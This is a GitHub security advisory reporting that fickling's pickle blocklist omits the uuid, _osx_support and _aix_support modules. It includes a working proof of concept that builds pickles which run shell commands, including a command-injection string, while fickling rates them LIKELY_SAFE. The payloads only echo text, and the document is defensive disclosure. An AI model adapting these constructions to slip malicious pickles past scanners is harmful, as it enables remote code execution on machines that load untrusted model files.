# [H] Fickling missing RCE-capable modules in UNSAFE_IMPORTS

## Summary
Severity: High
Advisory: GHSA-5hwf-rc88-82xm
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-5hwf-rc88-82xm
Type: github-advisory

## Affected
- PyPI: `fickling` — affected >=0 <0.1.9

## Details
# Assessment

The modules `uuid`, `_osx_support` and `_aix_support` were added to the blocklist of unsafe imports (https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b).

# Original report

## Summary

fickling's `UNSAFE_IMPORTS` blocklist is missing at least 3 stdlib modules that provide direct arbitrary command execution: `uuid`, `_osx_support`, and `_aix_support`. These modules contain functions that internally call `subprocess.Popen()` or `os.system()` with attacker-controlled arguments. A malicious pickle file importing these modules passes both `UnsafeImports` and `NonStandardImports` checks.


## Affected Versions

- fickling <= 0.1.8 (all versions)

## Details

### Missing Modules

fickling's `UNSAFE_IMPORTS` (86 modules) does not include:

| Module | RCE Function | Internal Mechanism | Importable On |
|--------|-------------|-------------------|---------------|
| `uuid` | `_get_command_stdout(cmd, *args)` | `subprocess.Popen((cmd,) + args, stdout=PIPE, stderr=DEVNULL)` | All platforms |
| `_osx_support` | `_read_output(cmdstring)` | `os.system(cmd)` via temp file | All platforms |
| `_osx_support` | `_find_build_tool(toolname)` | Command injection via `%s` in `_read_output("/usr/bin/xcrun -find %s" % toolname)` | All platforms |
| `_aix_support` | `_read_cmd_output(cmdstring)` | `os.system(cmd)` via temp file | All platforms |

**Critical note:** Despite the names `_osx_support` and `_aix_support` suggesting platform-specific modules, they are importable on ALL platforms. Python includes them in the standard distribution regardless of OS.

### Why These Pass fickling

1. **`NonStandardImports`**: These are stdlib modules, so `is_std_module()` returns True → not flagged
2. **`UnsafeImports`**: Module names not in `UNSAFE_IMPORTS` → not flagged
3. **`OvertlyBadEvals`**: Function names added to `likely_safe_imports` (stdlib) → skipped
4. **`UnusedVariables`**: Defeated by BUILD opcode (purposely unhardend)

### Proof of Concept (using fickling's opcode API)

```python
from fickling.fickle import (
    Pickled, Proto, Frame, ShortBinUnicode, StackGlobal,
    TupleOne, TupleTwo, Reduce, EmptyDict, SetItem, Build, Stop,
)
from fickling.analysis import check_safety
import struct, pickle

frame_data = b"\x95" + struct.pack("<Q", 60)

# uuid._get_command_stdout — works on ALL platforms
uuid_payload = Pickled([
    Proto(4),
    Frame(struct.pack("<Q", 60), data=frame_data),
    ShortBinUnicode("uuid"),
    ShortBinUnicode("_get_command_stdout"),
    StackGlobal(),
    ShortBinUnicode("echo"),
    ShortBinUnicode("PROOF_OF_CONCEPT"),
    TupleTwo(),
    Reduce(),
    EmptyDict(), ShortBinUnicode("x"), ShortBinUnicode("y"), SetItem(),
    Build(),
    Stop(),
])

# _aix_support._read_cmd_output — works on ALL platforms
aix_payload = Pickled([
    Proto(4),
    Frame(struct.pack("<Q", 60), data=frame_data),
    ShortBinUnicode("_aix_support"),
    ShortBinUnicode("_read_cmd_output"),
    StackGlobal(),
    ShortBinUnicode("echo PROOF_OF_CONCEPT"),
    TupleOne(),
    Reduce(),
    EmptyDict(), ShortBinUnicode("x"), ShortBinUnicode("y"), SetItem(),
    Build(),
    Stop(),
])

# _osx_support._find_build_tool — command injection via %s
osx_payload = Pickled([
    Proto(4),
    Frame(struct.pack("<Q", 60), data=frame_data),
    ShortBinUnicode("_osx_support"),
    ShortBinUnicode("_find_build_tool"),
    StackGlobal(),
    ShortBinUnicode("x; echo INJECTED #"),
    TupleOne(),
    Reduce(),
    EmptyDict(), ShortBinUnicode("x"), ShortBinUnicode("y"), SetItem(),
    Build(),
    Stop(),
])

# All three: fickling reports LIKELY_SAFE
for name, p in [("uuid", uuid_payload), ("aix", aix_payload), ("osx", osx_payload)]:
    result = check_safety(p)
    print(f"{name}: severity={result.severity}, issues={len(result.results)}")
    # Output: severity=Severity.LIKELY_SAFE, issues=0

# All three: pickle.loads() executes the command
pickle.loads(uuid_payload.dumps())  # prints PROOF_OF_CONCEPT
```

### Verified Output

```
$ python3 poc.py
uuid: severity=Severity.LIKELY_SAFE, issues=0
aix: severity=Severity.LIKELY_SAFE, issues=0
osx: severity=Severity.LIKELY_SAFE, issues=0
PROOF_OF_CONCEPT
```

## Impact

An attacker can craft a pickle file that executes arbitrary system commands while fickling reports it as `LIKELY_SAFE`. This affects any system relying on fickling for pickle safety validation, including ML model loading pipelines.

## Suggested Fix

Add to `UNSAFE_IMPORTS` in fickling:
```python
"uuid",
"_osx_support",
"_aix_support",
```

**Longer term:** Consider an allowlist approach — only permit known-safe stdlib modules rather than blocking known-dangerous ones. The current 86-module blocklist still has gaps because the Python stdlib contains hundreds of modules.

## Resources

- Python source: `Lib/uuid.py` lines 156-168 (`_get_command_stdout`)
- Python source: `Lib/_osx_support.py` lines 35-52 (`_read_output`), lines 54-68 (`_find_build_tool`)
- Python source: `Lib/_aix_support.py` lines 14-30 (`_read_cmd_output`)
- fickling source: `analysis.py` `UNSAFE_IMPORTS` set

## References
- https://github.com/trailofbits/fickling/security/advisories/GHSA-5hwf-rc88-82xm
- https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b
- https://github.com/trailofbits/fickling
